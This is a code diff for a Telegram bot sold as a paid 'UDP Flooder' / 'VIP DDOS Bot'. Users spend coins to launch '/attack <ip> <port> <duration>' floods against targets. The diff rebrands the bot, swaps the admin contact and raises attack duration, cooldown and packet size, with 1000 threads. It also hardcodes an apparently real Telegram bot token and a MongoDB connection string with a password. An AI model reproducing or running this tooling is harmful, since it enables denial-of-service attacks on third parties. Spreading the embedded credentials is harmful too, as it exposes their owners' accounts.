@@ -10,19 +10,19 @@ attack_in_progress = False
 current_attack = None  # Store details of the current attack
 attack_history = []  # Store attack logs
 
-TELEGRAM_BOT_TOKEN = '7909451173:AAGCVD3Utdku_fayZWe9SNB01XoxSsBwECU'
-ADMIN_USER_ID = 7083378335
+TELEGRAM_BOT_TOKEN = '7179492458:AAFX-GmG9ojRbWyTCDuyAtzDcQE8Io0H7-c'
+ADMIN_USER_ID = 1291795330
 MONGO_URI = "mongodb+srv://VIP:7OMbiO6JV74CFy0I@cluster0.rezah.mongodb.net/VipDatabase?retryWrites=true&w=majority&appName=Cluster0"
 DB_NAME = "known"
 COLLECTION_NAME = "users"
 attack_in_progress = False
-ATTACK_TIME_LIMIT = 240  # Maximum attack duration in seconds
+ATTACK_TIME_LIMIT = 300  # Maximum attack duration in seconds
 COINS_REQUIRED_PER_ATTACK = 5  # Coins required for an attack
-ATTACK_COOLDOWN = 240  # Cooldown period in seconds (5 minutes)
+ATTACK_COOLDOWN = 300  # Cooldown period in seconds (5 minutes)
 
 
 threads = 1000
-packet_size = 13
+packet_size = 24
 
 # Global variables for managing cooldowns
 last_attack_time = defaultdict(lambda: datetime.min)
@@ -50,7 +50,7 @@ async def update_user(user_id, coins):
 async def start(update: Update, context: CallbackContext):
     chat_id = update.effective_chat.id
     message = (
-        "*🎉 Welcome to the Ak47 Ultimate UDP Flooder! 🎉*\n\n"
+        "*🎉 Welcome to the SAM Ultimate UDP Flooder! 🎉*\n\n"
         "*🔥 Experience the pinnacle of hacking with our advanced features! 🔥*\n\n"
         "*✨ Key Features: ✨*\n"
         "🚀 *Initiate attacks on your opponents using /attack*\n"
@@ -59,7 +59,7 @@ async def start(update: Update, context: CallbackContext):
         "*⚠️ How to Use: ⚠️*\n"
         "*Utilize the commands and type /help for a complete list of commands.*\n\n"
         "*💬 Queries or Issues? 💬*\n"
-        "*Contact Admin: @TREXVIVEK*"
+        "*Contact Admin: @Baap_hu_ter4*"
     )
     await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
 
@@ -254,7 +254,7 @@ async def myinfo(update: Update, context: CallbackContext):
 async def help(update: Update, context: CallbackContext):
     chat_id = update.effective_chat.id
     message = (
-        "*🛠️ Ak47 VIP DDOS Bot Help Menu 🛠️*\n\n"
+        "*🛠️ SAM VIP DDOS Bot Help Menu 🛠️*\n\n"
         "🌟 *Find everything you need here!* 🌟\n\n"
         "📜 *Available Commands:* 📜\n\n"
         "1️⃣ *🔥 /attack <ip> <port> <duration>*\n"
@@ -270,7 +270,7 @@ async def help(update: Update, context: CallbackContext):
         "   - *You're already using this command! It explains all the bot's features.*\n\n"
         "🚨 *Important Tips:* 🚨\n"
         "- *If the bot doesn't reply, it means another user is attacking. Please wait.*\n"
-        "- *If you encounter any issues, contact the admin: @TREXVIVEK*\n\n"
+        "- *If you encounter any issues, contact the admin: @Baap_hu_ter4*\n\n"
         "💥 *Now go and start your hacking adventures!* 💥"
     )
     await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')
